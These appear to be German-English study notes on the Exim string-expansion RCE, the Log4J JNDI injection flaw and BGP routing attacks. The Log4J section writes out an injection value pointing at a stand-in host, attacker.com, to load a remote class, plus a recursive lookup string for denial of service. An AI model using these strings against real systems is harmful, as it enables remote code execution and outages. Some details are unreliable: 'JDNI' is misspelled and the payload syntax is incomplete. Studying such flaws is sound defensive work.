## Exim - RCE (Remote Code Execution)
- Aufgrund von (not sanitized) string expansion kann shellcode injected und ausgeführt werden
- Sendet den echo von dem shell script an requester zurück
- Mittlerweile nur noch lokal mögl (mit sonder config remote)
- Problem:
  - Exim läuft oft als root (mächtiger exploit if successfull)

## Log4J - Internet died
- Log4J = Java logging lib
- JDNI = Java Naming und Directory Interface
  - Verfahren um auf remote resource zu accessen (via RMI, LDAP, HTTP/S, File System etc..)
- Example (logging of userAgent):
  - `log.info("UserAgent:{}", userAgent)`
  - logged den userAgent
  - **`ABER`** was wenn `userAgent = "jdni:ldap://attacker.com/a"` ist ?
    - URI gibt Java Class zurück -> `RCI (Remote Code Injection) / RCE (Remote Code Exectution)`
  - Config can fix (log4j.formatMsgNoLookups = true)
    - **`ABER`** JDNI kann geDoS'd werden (ohne lookups) mit `${${::-$${::-j}}}` (endlos recursion in JDNI lookup)
    - `-> DoS`

## BGP Angreifen
- BGP = Border Gateway Protocl (benutzt um automatisch Routingentscheidungen zu treffen)
- Wird benutzt um die Kommunikation von verschiedenen ISP-Netzen zu automatisieren
- GOALS (BGP): Ausfallsicherheit & so schnell und günstig routen 
- Routing-Tabellen angreifen 
  - -> `DoS` & `Ausspähen und Manipulieren von Paketen`